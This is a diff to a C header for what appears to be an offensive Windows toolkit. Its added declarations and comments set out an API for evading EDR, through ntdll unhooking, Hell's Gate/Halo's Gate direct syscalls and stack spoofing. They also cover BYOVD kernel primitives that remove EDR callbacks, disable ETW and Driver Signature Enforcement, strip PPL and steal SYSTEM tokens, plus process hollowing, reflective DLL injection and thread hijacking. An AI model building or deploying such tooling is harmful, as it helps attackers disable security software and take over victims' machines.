@@ -39,15 +39,72 @@ bool jocky_check_timing_api(void);
  * ============================================================================ */
 
 #ifdef _WIN32
-/* Unhook ntdll.dll by reloading a fresh copy from disk */
+
+/* ── ntdll unhooking ─────────────────────────────────────────────────── */
+
+/* Reload a clean .text from System32\ntdll.dll, overwriting any inline
+ * hooks placed by EDR/AV.  Uses NtProtectVirtualMemory directly to avoid
+ * the hooked VirtualProtect.  Call before any sensitive ntdll-routed work. */
 bool jocky_unhook_ntdll(void);
 
-/* Get syscall number for a given Zw* function name */
-uint32_t jocky_get_syscall_number(const char* zw_name);
+/* ── Direct syscalls: Hell's Gate + Halo's Gate ──────────────────────── */
 
-/* Execute a direct syscall */
-intptr_t jocky_direct_syscall(uint32_t syscall_number, ...);
-#endif /* _WIN32 */
+/* Resolve SSN for a Zw* function name.
+ * Hell's Gate: reads SSN from the unhooked stub directly.
+ * Halo's Gate: if the stub is patched, scans adjacent Zw* exports in
+ *              alphabetical (= SSN) order and infers the SSN by offset. */
+uint32_t jocky_get_syscall_number(const char* zw_name);
+uint32_t jocky_get_syscall_num   (const char* zw_name); /* alias */
+
+/* Execute a direct syscall (up to 4 register args).
+ * Allocates a one-shot RWX stub per call; does not call through ntdll. */
+intptr_t jocky_direct_syscall (uint32_t ssn,
+                                uintptr_t a1, uintptr_t a2,
+                                uintptr_t a3, uintptr_t a4);
+intptr_t jocky_direct_syscall4(uint32_t ssn,
+                                uintptr_t a1, uintptr_t a2,
+                                uintptr_t a3, uintptr_t a4); /* alias */
+
+/* ── Stack / return-address spoofing ─────────────────────────────────── */
+
+/* Find a RET gadget (0xC3) in ntdll.dll's .text section.
+ * Prefers `ret; int3` (0xC3 0xCC) to avoid false-positive chains.
+ * Result is cached on first call. */
+PVOID jocky_find_ret_gadget(void);
+
+/* Call fn(a1,a2,a3,a4) with the immediate return address replaced by a
+ * RET gadget inside ntdll.dll.  During fn's execution the call stack shows:
+ *   fn  ← ntdll!<ret gadget>  ← our real return addr (deeper)
+ * Falls back to a direct call if no gadget is available. */
+intptr_t jocky_spoof_call(PVOID fn,
+                           uintptr_t a1, uintptr_t a2,
+                           uintptr_t a3, uintptr_t a4);
+
+/* Stack-spoofed direct syscall — combines jocky_spoof_call + jocky_direct_syscall.
+ * The stack during the syscall shows a return addr inside ntdll.dll. */
+intptr_t jocky_spoof_syscall(uint32_t ssn,
+                              uintptr_t a1, uintptr_t a2,
+                              uintptr_t a3, uintptr_t a4);
+
+/* ── Nt* convenience wrappers ────────────────────────────────────────── */
+
+typedef LONG NTSTATUS;
+
+NTSTATUS jocky_nt_allocate_virtual_memory(HANDLE process, PVOID* base,
+                                           ULONG_PTR zero_bits, PSIZE_T size,
+                                           ULONG type, ULONG protect);
+NTSTATUS jocky_nt_protect_virtual_memory (HANDLE process, PVOID* base,
+                                           PSIZE_T size, ULONG new_protect,
+                                           PULONG old_protect);
+NTSTATUS jocky_nt_write_virtual_memory   (HANDLE process, PVOID base,
+                                           PVOID buffer, SIZE_T size,
+                                           PSIZE_T written);
+NTSTATUS jocky_nt_create_thread          (HANDLE* handle, ACCESS_MASK access,
+                                           POBJECT_ATTRIBUTES attrs,
+                                           HANDLE process, PVOID start,
+                                           PVOID arg, ULONG flags, PULONG tid);
+
+#endif /* _WIN32 (evasion) */
 
 /* ============================================================================
  * BYOVD Loader
@@ -143,21 +200,95 @@ bool jocky_driver_invoke(jocky_byovd_t* ctx, const char* primitive,
 #endif /* _WIN32 (BYOVD + driver interaction) */
 
 /* ============================================================================
- * Execution: In-Memory Techniques
+ * Kernel Exploitation Primitives  *(Windows only, requires BYOVD)*
  * ============================================================================ */
 
 #ifdef _WIN32
-/* Process hollowing: replace a suspended process image */
+
+/* ── Low-level kernel virtual R/W ───────────────────────────────────────
+ * Built on top of jocky_driver_read/write_phys via 4-level page table walk.
+ * Requires jocky_byovd_load() to have run first.
+ * ctx->device must be valid; s_cr3 is lazily initialised on first call.    */
+bool jocky_kread (jocky_byovd_t* ctx, uint64_t kva, void*       out, uint32_t size);
+bool jocky_kwrite(jocky_byovd_t* ctx, uint64_t kva, const void* in,  uint32_t size);
+
+/* ── Exploitation primitives ────────────────────────────────────────────
+ * All of these call jocky_kread/jocky_kwrite internally.
+ * Bootstrap: first call scans ≤ 1 GB physical memory for System EPROCESS
+ * to obtain CR3.  Subsequent calls reuse the cached CR3.               */
+
+/* Zero every active RoutineBlock* in PspCreateProcessNotifyRoutine,
+ * PspCreateThreadNotifyRoutine, and PspLoadImageNotifyRoutine arrays.
+ * Returns true if at least one callback was removed. */
+bool jocky_disable_edr_callbacks(jocky_byovd_t* ctx);
+
+/* Find and zero the EtwpEventEnabled flag referenced by EtwEventWrite.
+ * Disables all kernel ETW write paths for this boot session. */
+bool jocky_disable_etw(jocky_byovd_t* ctx);
+
+/* Zero EPROCESS.Protection for the given PID, removing PPL/PP shielding.
+ * After this call, the process can be opened with any desired access. */
+bool jocky_strip_ppl(jocky_byovd_t* ctx, uint32_t pid);
+
+/* Replace the primary token of target_pid with the SYSTEM process token,
+ * granting SYSTEM-level privileges to the target process. */
+bool jocky_elevate_token(jocky_byovd_t* ctx, uint32_t target_pid);
+
+/* Strip SeDebug, SeTcb, and SeLoadDriver from target_pid's token bitmasks,
+ * reducing an over-privileged process. */
+bool jocky_downgrade_token(jocky_byovd_t* ctx, uint32_t target_pid);
+
+/* Set g_CiOptions in ci.dll to 0, disabling Driver Signature Enforcement.
+ * !! PatchGuard monitors this value – call only in a PG-suppressed window. !!
+ * Original value is cached; call jocky_restore_dse() before unloading. */
+bool jocky_disable_dse(jocky_byovd_t* ctx);
+
+/* Restore g_CiOptions to the value captured by jocky_disable_dse().
+ * No-op if jocky_disable_dse() was never called. */
+bool jocky_restore_dse(jocky_byovd_t* ctx);
+
+#endif /* _WIN32 (kernel exploitation) */
+
+/* ============================================================================
+ * Execution: In-Memory Techniques  *(Windows only)*
+ * ============================================================================ */
+
+#ifdef _WIN32
+
+/* Process hollowing — create target_path suspended, replace its image with
+ * payload, fix the entry point in the thread context, resume. */
 bool jocky_process_hollow(const wchar_t* target_path,
                           const uint8_t* payload,
                           size_t payload_size);
 
-/* Module stomping: overwrite a loaded DLL in a remote process */
+/* Module stomping — find module_name in pid's loaded-module list, make its
+ * region RWX, overwrite with payload (headers + sections), execute at EP. */
 bool jocky_module_stomp(uint32_t pid,
                         const wchar_t* module_name,
                         const uint8_t* payload,
                         size_t payload_size);
-#endif /* _WIN32 */
+
+/* Reflective DLL injection — write dll_bytes to RWX memory in pid, then
+ * CreateRemoteThread at the "ReflectiveLoader" export inside the DLL.
+ * Returns false if the DLL has no "ReflectiveLoader" export. */
+bool jocky_rdll_inject(uint32_t pid,
+                       const uint8_t* dll_bytes,
+                       size_t dll_size);
+
+/* Process parameter poisoning (P³) — overwrite PEB.RTL_USER_PROCESS_PARAMETERS
+ * CommandLine and/or ImagePathName in the target process.  Pass NULL for any
+ * field you don't want to change. */
+bool jocky_p3_poison(uint32_t pid,
+                     const wchar_t* fake_cmdline,
+                     const wchar_t* fake_image_path);
+
+/* Thread execution hijacking — find a thread in pid, suspend it, inject
+ * shellcode into an RWX allocation, redirect the thread's RIP to it, resume. */
+bool jocky_thread_hijack(uint32_t pid,
+                          const uint8_t* shellcode,
+                          size_t shellcode_size);
+
+#endif /* _WIN32 (execution) */
 
 /* ============================================================================
  * Cleanup: Self-Deletion, Log Clearing, Anti-Forensics
@@ -209,45 +340,3 @@ uint32_t jocky_runtime_init(void);
 #endif
 
 #endif /* JOCKY_RT_H */
-
-/* ============================================================================
- * Direct Syscalls (Hell's Gate) - Windows x64
- * ============================================================================ */
-
-#ifdef _WIN32
-
-/* Execute direct syscall with 4 arguments */
-intptr_t jocky_direct_syscall4(uint32_t syscall_number, 
-                                uintptr_t a1, uintptr_t a2, 
-                                uintptr_t a3, uintptr_t a4);
-
-/* Execute direct syscall with 6 arguments */
-intptr_t jocky_direct_syscall6(uint32_t syscall_number,
-                                uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4,
-                                uintptr_t a5, uintptr_t a6);
-
-/* Get syscall number by name (e.g., "NtAllocateVirtualMemory") */
-uint32_t jocky_get_syscall_num(const char* zw_name);
-
-/* Convenience wrappers */
-NTSTATUS jocky_nt_allocate_virtual_memory(HANDLE process, PVOID* base,
-                                           ULONG_PTR zero_bits, PSIZE_T size,
-                                           ULONG type, ULONG protect);
-
-NTSTATUS jocky_nt_protect_virtual_memory(HANDLE process, PVOID* base,
-                                          PSIZE_T size, ULONG new_protect,
-                                          PULONG old_protect);
-
-NTSTATUS jocky_nt_create_thread(HANDLE* thread_handle, ACCESS_MASK desired_access,
-                                 POBJECT_ATTRIBUTES object_attributes, HANDLE process_handle,
-                                 PVOID start_routine, PVOID argument,
-                                 ULONG create_flags, PULONG thread_id);
-
-NTSTATUS jocky_nt_write_virtual_memory(HANDLE process, PVOID base, PVOID buffer,
-                                        SIZE_T size, PSIZE_T written);
-
-NTSTATUS jocky_nt_protect_virtual_memory(HANDLE process, PVOID* base,
-                                          PSIZE_T size, ULONG new_protect,
-                                          PULONG old_protect);
-
-#endif /* _WIN32 */
